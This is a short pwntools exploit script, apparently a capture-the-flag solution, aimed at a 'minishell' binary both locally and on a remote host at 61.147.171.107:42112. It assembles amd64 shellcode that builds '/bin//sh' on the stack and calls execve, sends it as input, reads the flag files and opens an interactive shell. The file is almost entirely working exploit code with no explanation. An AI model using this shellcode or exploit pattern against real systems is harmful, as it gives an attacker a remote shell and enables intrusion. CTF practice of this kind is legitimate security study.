from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./pwn"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("61.147.171.107", 42112)


def ddebug(b=""):
    if not f_gdb:
        return
    gdb.attach(io, gdbscript=b)
    pause()


payload = b""
stage1 = asm('''
    lea    rsp,[rdi+0x70]
    mov    rbx,0x68732f2f6e69622f
    push   rbx
    push   rsp
    pop    rdi
    mov    al,59
    syscall
''')

ddebug("break *0x0401E6B\nb *0x100000011 \n continue")
io.sendlineafter(b"minishell$ ", b"cat")
io.sendline(stage1)
io.sendline(b"cat flag*")
io.interactive()
